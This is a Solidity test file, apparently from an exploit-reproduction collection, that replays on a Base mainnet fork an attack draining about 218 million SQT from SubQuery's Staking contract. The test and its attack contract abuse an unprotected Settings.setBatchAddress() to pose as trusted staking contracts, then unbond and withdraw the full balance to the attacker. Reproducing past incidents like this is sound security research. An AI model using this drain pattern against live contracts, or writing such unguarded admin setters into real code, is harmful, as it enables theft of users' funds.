// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 218.07M SQT
// Attacker : 0x910175f3fee798ADD5faBD3e9cbB63D0a785482C
// Attack Contract : 0xF5D3C18416f364342d8AaD69AFC13e490d05a7af
// Vulnerable Contract : 0xf282737992Da4217bf5f8B6AE621181e84d7d3b9
// Victim : 0x7A68b10EB116a8b71A9b6f77B32B47EB591B6Ded
// Attack Tx : https://basescan.org/tx/0xd063b3848a6b8c67f46990ab166665d454147855819acb60c083c0aea0180b2d

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xf282737992Da4217bf5f8B6AE621181e84d7d3b9#code

// @Analysis
// Telegram : https://t.me/defimon_alerts/2909
//
// The attacker used the unprotected Settings.setBatchAddress() function to make the attack helper the
// StakingManager and RewardsDistributor. Staking then accepted the helper's unbondCommission() and
// withdrawARequest() calls and transferred the Staking proxy's SQT balance to the helper, which forwarded it.

address constant ATTACKER = 0x910175f3fee798ADD5faBD3e9cbB63D0a785482C;
address constant SETTINGS_PROXY = 0x1d1e8C85A2C99575fCb95903C9aD9Ae2aDEA54fc;
address constant STAKING_PROXY = 0x7A68b10EB116a8b71A9b6f77B32B47EB591B6Ded;
address constant SQT = 0x858c50C3AF1913b0E849aFDB74617388a1a5340d;

uint256 constant PER_MILL = 1e6;

enum SQContracts {
    SQToken,
    Staking,
    StakingManager,
    IndexerRegistry,
    ProjectRegistry,
    EraManager,
    PlanManager,
    ServiceAgreementRegistry,
    RewardsDistributor,
    RewardsPool,
    RewardsStaking,
    RewardsHelper,
    InflationController,
    Vesting,
    DisputeManager,
    StateChannel,
    ConsumerRegistry,
    PriceOracle,
    Treasury,
    RewardsBooster,
    StakingAllocation
}

interface ISubQuerySettings {
    function setBatchAddress(
        SQContracts[] calldata sq,
        address[] calldata newAddresses
    ) external;
    function getContractAddress(
        SQContracts sq
    ) external view returns (address);
}

interface ISubQueryStaking {
    function unbondCommission(
        address runner,
        uint256 amount
    ) external;
    function withdrawARequest(
        address source,
        uint256 index
    ) external;
    function unbondFeeRate() external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    ISubQuerySettings private constant settings = ISubQuerySettings(SETTINGS_PROXY);
    ISubQueryStaking private constant staking = ISubQueryStaking(STAKING_PROXY);
    IERC20 private constant sqt = IERC20(SQT);

    function setUp() public {
        uint256 forkBlock = 44_590_468;
        vm.createSelectFork("base", forkBlock);
        fundingToken = SQT;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(SETTINGS_PROXY, "SubQuery Settings proxy");
        vm.label(STAKING_PROXY, "SubQuery Staking proxy");
        vm.label(SQT, "SQT");
    }

    function testExploit() public balanceLog {
        address originalStakingManager = settings.getContractAddress(SQContracts.StakingManager);
        address originalRewardsDistributor = settings.getContractAddress(SQContracts.RewardsDistributor);
        uint256 stakingSqtBefore = sqt.balanceOf(STAKING_PROXY);
        uint256 attackerSqtBefore = sqt.balanceOf(ATTACKER);

        SubQuerySettingsExploit exploit = new SubQuerySettingsExploit(ATTACKER);

        vm.prank(ATTACKER);
        exploit.attack();

        uint256 attackerProfit = sqt.balanceOf(ATTACKER) - attackerSqtBefore;
        uint256 expectedFee = (stakingSqtBefore * staking.unbondFeeRate()) / PER_MILL;

        assertEq(settings.getContractAddress(SQContracts.StakingManager), originalStakingManager, "manager restored");
        assertEq(
            settings.getContractAddress(SQContracts.RewardsDistributor),
            originalRewardsDistributor,
            "rewards distributor restored"
        );
        assertEq(sqt.balanceOf(STAKING_PROXY), 0, "staking SQT drained");
        assertEq(attackerProfit, stakingSqtBefore - expectedFee, "profit equals drained balance less fee");
        assertGt(attackerProfit, 218_000_000 ether, "SQT profit");
    }
}

contract SubQuerySettingsExploit {
    ISubQuerySettings private constant settings = ISubQuerySettings(SETTINGS_PROXY);
    ISubQueryStaking private constant staking = ISubQueryStaking(STAKING_PROXY);
    IERC20 private constant sqt = IERC20(SQT);

    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");

        uint256 drainAmount = sqt.balanceOf(STAKING_PROXY);
        address originalStakingManager = settings.getContractAddress(SQContracts.StakingManager);
        address originalRewardsDistributor = settings.getContractAddress(SQContracts.RewardsDistributor);

        SQContracts[] memory ids = new SQContracts[](2);
        ids[0] = SQContracts.StakingManager;
        ids[1] = SQContracts.RewardsDistributor;

        address[] memory attackerContracts = new address[](2);
        attackerContracts[0] = address(this);
        attackerContracts[1] = address(this);

        // step 1: become both dependency contracts used by Staking access checks.
        settings.setBatchAddress(ids, attackerContracts);

        // step 2: as RewardsDistributor, create an unbond request for the full SQT balance held by Staking.
        staking.unbondCommission(address(this), drainAmount);

        // step 3: as StakingManager, withdraw that request immediately and receive the available SQT.
        staking.withdrawARequest(address(this), 0);

        address[] memory originalContracts = new address[](2);
        originalContracts[0] = originalStakingManager;
        originalContracts[1] = originalRewardsDistributor;

        // step 4: restore Settings entries, matching the trace cleanup.
        settings.setBatchAddress(ids, originalContracts);

        // step 5: forward the drained SQT to the attacker EOA.
        sqt.transfer(profitReceiver, sqt.balanceOf(address(this)));
    }
}
